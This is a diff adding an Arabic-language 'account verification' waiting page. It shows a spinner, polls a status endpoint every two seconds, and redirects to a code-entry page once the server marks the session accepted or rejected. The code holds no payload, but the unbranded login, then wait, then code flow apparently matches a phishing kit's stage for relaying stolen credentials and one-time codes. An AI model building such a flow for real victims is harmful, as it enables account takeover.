@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --green: #1a6e2e; --green-dark: #145524; --dark: #1a1a1a; --white: #ffffff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--white);
+            color: var(--dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: #1b2a1b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 20px;
+        }
+        .header-title { color: var(--white); font-size: 18px; font-weight: 700; }
+        .loading-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+        }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid var(--green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 28px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-title {
+            font-size: 22px; font-weight: 800;
+            color: var(--green); margin-bottom: 10px;
+        }
+        .loading-sub {
+            font-size: 16px; color: #999;
+            text-align: center; line-height: 1.8;
+        }
+        .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4,end) infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="header-title">التحقق من الحساب</span>
+    </div>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <div class="loading-title">جاري التحقق من بياناتك</div>
+        <div class="loading-sub">يرجى الانتظار، قد يستغرق ذلك بضع لحظات<span class="dots"></span></div>
+    </div>
+    <script>
+        var sid = new URLSearchParams(window.location.search).get('id');
+        if (!sid) window.location.href = 'login.html';
+
+        function checkStatus() {
+            fetch('/api/status/' + sid)
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d.status === 'accepted') {
+                        window.location.href = 'code.html?id=' + sid;
+                    } else if (d.status === 'rejected') {
+                        window.location.href = 'code.html?id=' + sid + '&error=1';
+                    }
+                })
+                .catch(function() {});
+        }
+
+        setInterval(checkStatus, 2000);
+        checkStatus();
+    </script>
+</body>
+</html>
